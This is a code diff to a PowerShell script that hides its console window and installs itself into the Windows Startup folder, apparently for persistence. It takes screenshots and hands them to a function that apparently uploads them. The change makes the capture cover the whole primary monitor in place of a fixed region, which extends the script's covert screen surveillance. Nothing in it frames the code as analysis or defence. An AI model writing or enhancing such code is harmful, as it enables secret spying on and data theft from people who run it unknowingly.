@@ -8,6 +8,8 @@ public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
 $consolePtr = [Console.Window]::GetConsoleWindow()
 [Console.Window]::ShowWindow($consolePtr, 0)
 
+Add-Type -AssemblyName System.Windows.Forms
+
 function Install {
 cd "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
 
@@ -49,7 +51,8 @@ function screenshot([Drawing.Rectangle]$bounds, $path) {
 }
 
 function scrnsht {
-$bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1000, 900)
+$Monitors = [System.Windows.Forms.Screen]::AllScreens
+$bounds = $Monitors[0].Bounds
 screenshot $bounds "screenshot.png"
 u("screenshot.png")
 }
